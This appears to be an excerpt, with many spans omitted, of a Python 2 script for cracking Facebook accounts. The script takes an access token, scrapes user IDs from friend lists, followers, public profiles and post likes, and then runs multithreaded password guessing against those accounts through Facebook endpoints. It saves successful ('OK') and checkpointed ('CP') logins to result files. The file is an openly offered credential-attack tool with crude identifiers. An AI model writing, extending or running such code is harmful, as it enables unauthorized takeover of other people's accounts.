...
def hasil(ok,cp):
    if len(ok) != 0 or len(cp) != 0:
        ...
        print '\n\n %s[%s•%s] Terimakasih telah menggunakan script ini...'%(N,K,N)
...
def yayanxd():
    ...
    kontol = raw_input('\n %s[%s?%s] Enter your token :%s '%(N,M,N,H))
    ...
    try:
        ...
        raw_input(' %s[•]%s ENTER TO CONTINUE '%(O,N));wuhan(kontol)
        os.system('xdg-open https://youtube.com/channel/UCqwjydkaE3y0qo-3Yl3yL3A')
        moch_yayan()
    except KeyError:
        print '\n\n %s[%s!%s] SORY, YOUR TOKEN INVALID!!'%(N,M,N);time.sleep(2);yayanxd()
...
def moch_yayan():
    ...
    try:
        ...
        print '\n %s[%s×%s] SORY, YOUR TOKEN INVALID!!'%(N,M,N);time.sleep(2);os.system('rm -rf .memek.txt');yayanxd()
    try:
        nama = requests.get('https://graph.facebook.com/me?access_token=%s'%(kontol)).json()['name']
    except KeyError:
        print '\n %s[%s×%s] SORY, YOUR TOKEN INVALID!!'%(N,M,N);time.sleep(2);os.system('rm -rf .memek.txt');yayanxd()
    ...
    print ' [%s04%s]. Dump id from like post'%(O,N);time.sleep(0.03)
    print ' [%s05%s]. Start crack/Mulai crack'%(O,N);time.sleep(0.03)
    print ' [%s06%s]. Check fb account information'%(O,N);time.sleep(0.03)
...
def teman(kontol):
    ...
    try:
        ...
        print ' [%s•%s] copy file dump 👉 ( %s%s%s )'%(O,N,M,cin,N)
        print 50 * '-'
...
def publik(kontol):
    ...
    try:
        ...
        print ' [%s•%s] copy file dump 👉 ( %s%s%s )'%(O,N,M,knt,N)
        print 50 * '-'
        raw_input(' [%s ENTER%s ] '%(O,N));moch_yayan()
    except (KeyError,IOError):
        os.remove(knt)
...
def followers(kontol):
    ...
    try:
        ...
        print ' [%s•%s] copy file dump 👉 ( %s%s%s )'%(O,N,M,ah,N)
        print 50 * '-'
        raw_input(' [%s ENTER%s ] '%(O,N));moch_yayan()
    except (KeyError,IOError):
        os.remove(ah)
...
def postingan(kontol):
    ...
    try:
        ...
        print ' [%s•%s] copy file dump 👉 ( %s%s%s )'%(O,N,M,ahh,N)
        print 50 * '-'
        raw_input(' [%s ENTER%s ] '%(O,N));moch_yayan()
    except (KeyError,IOError):
        os.remove(ahh)
...
class __crack__:
                ...
                if pwek == '':
                    ...
                    def __yan__(ysc=None): # ycs => Yayan sayang Cindy:3
                        ...
                        if cin == '':
                            ...
                            print '\n [%s•%s] Akun OK saved in, -> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
                            print ' [%s•%s] Akun CP saved in -> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
                            print '\n [%s!%s] Jika tidak ada hasil, gunakan mode pesawat (2detik)\n'%(M,N)
                            with YayanGanteng(max_workers=30) as (__yayanXD__):
                                for ikeh in self.id:
                                    try:
                                        kimochi = ikeh.split('<=>')[0]
                            ...
                            print '\n [%s•%s] Akun OK saved in -> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
                            print ' [%s•%s] Akun CP saved in -> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
                            print '\n [%s!%s] Jika tidak ada hasil, gunaka mode pesawat (2detik,)\n'%(M,N)
                            with YayanGanteng(max_workers=30) as (__yayanXD__):
                                for ikeh in self.id:
                                    try:
                                        kimochi = ikeh.split('<=>')[0]
    ...
    def __api__(self, user, __yan__):
        global ok,cp,loop
        sys.stdout.write('\r [Cracking][%s/%][OK-:%s][CP-:%s] '%(O,N,loop,len(self.id),len(ok),len(cp))),
        sys.stdout.flush()
        for pw in __yan__:
            pw = pw.lower()
    ...
    def __mbasic__(self, user, __yan__):
        global ok,cp,loop
        sys.stdout.write('\r [Cracking][%s/%s][OK-:%s][CP-:%s] '%(O,N,loop,len(self.id),len(ok),len(cp))),
        sys.stdout.flush()
        for pw in __yan__:
            pw = pw.lower()
            try: os.mkdir('results')
    ...
    def __pler__(self):
        ...
        if yan == '':
            ...
            print '\n [%s•%s] Akun OK disimpan di-> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
            print ' [%s•%s] Akun CP disimpan di-> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
